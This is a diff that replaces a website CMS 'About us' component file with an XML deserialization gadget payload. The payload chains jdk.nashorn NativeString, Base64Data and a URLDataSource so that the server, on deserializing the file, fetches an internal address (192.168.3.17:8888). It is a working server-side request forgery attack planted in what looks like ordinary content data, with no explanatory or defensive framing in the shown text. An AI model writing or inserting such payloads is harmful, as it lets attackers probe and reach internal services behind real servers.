@@ -1,23 +1,18 @@
-<?xml version="1.0" encoding="UTF-8"?>
-<component>
-	<content-type>/component/about-component</content-type>	<display-template>/templates/web/components/AboutComponent.ftl</display-template>
-	<merge-strategy>inherit-levels</merge-strategy>
-	<objectGroupId>ca53</objectGroupId>
-	<objectId>ca534227-9678-7e1e-31e2-1ddb6df9f46c</objectId>
-	<file-name>about.xml</file-name>
-	<folder-name/>
-	<internal-name>about</internal-name>
-	<subTitle_t>About us</subTitle_t>
-	<title_t>We are kinetic</title_t>
-	<buttonTitle_t>discover more</buttonTitle_t>
-	<buttonUrl_s>/#t3</buttonUrl_s>
-	<backgroundImage_s>/static-assets/img/about-bg.png</backgroundImage_s>
-	<decorativeImage_s>/static-assets/img/item-02.jpg</decorativeImage_s>
-	<mainText_t>This kinetic HTML template is provided by Tooplate for free of charge. You may use this layout for your website. Please tell your friends about Tooplate. Thank you. Cras suscipit, sem vel cursus iaculis, nibh augue placerat enim, in varius dolor turpis at augue. Nulla facilisi. In quis sem pellentesque, tristique ligula non, tincidunt ipsum. Curabitur porttitor, justo id egestas egestas, enim augue lacinia quam, et volutpat velit augue sodales velit.
-
-</mainText_t>
-	<createdDate>2017-12-19T19:29:51.000Z</createdDate>
-	<createdDate_dt>2017-12-19T19:29:51.000Z</createdDate_dt>
-	<lastModifiedDate>2018-02-13T17:49:34.905Z</lastModifiedDate>
-	<lastModifiedDate_dt>2018-02-13T17:49:34.905Z</lastModifiedDate_dt>
-</component>
+<map>
+	<version>2</version>
+   <entry>
+      <jdk.nashorn.internal.objects.NativeString>
+         <flags>0</flags>
+         <value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data">
+            <dataHandler>
+               <dataSource class="javax.activation.URLDataSource">
+                  <url>http://192.168.3.17:8888/internal/:</url>
+               </dataSource>
+               <transferFlavors/>
+            </dataHandler>
+            <dataLen>0</dataLen>
+         </value>
+      </jdk.nashorn.internal.objects.NativeString>
+      <string>test</string>
+   </entry>
+</map>
